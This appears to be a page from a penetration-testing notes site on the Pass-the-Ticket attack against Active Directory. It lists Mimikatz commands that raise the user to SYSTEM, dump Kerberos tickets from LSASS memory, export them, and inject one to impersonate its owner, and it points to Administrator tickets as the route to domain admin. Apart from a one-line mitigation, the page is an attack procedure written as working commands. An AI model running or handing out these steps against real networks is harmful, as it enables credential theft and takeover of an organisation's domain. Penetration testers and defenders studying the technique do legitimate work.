---
title: "Pass-the-Ticket"
description: "Pass-the-Ticket attack."
lead: "How to perform Pass-the-Ticket using Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "lateral_movement"
weight: 60
toc: true
---

## Overview

- Use mimikatz to dump TGT from LSASS memory
- Will give us .kirbi ticket which can be used to gain domain admin if ticket is from domain admin
- Reuse old ticket to impersonate that ticket
- Can also use base64-encoded tickets gathered with Rubeus
- Look for Administrator tickets

## Exploitation

```powershell
# Start mimikatz and get SYSTEM
mimikatz.exe
privilege::debug
token::elevate

# Export all .kirbi tickets to current directory
sekurlsa::tickets /export

# PTT with mimikatz
kerberos::ptt <ticket>

# List cached tickets
klist
```

## Mitigation:

- Don't let domain admins log onto anything except the domain controller
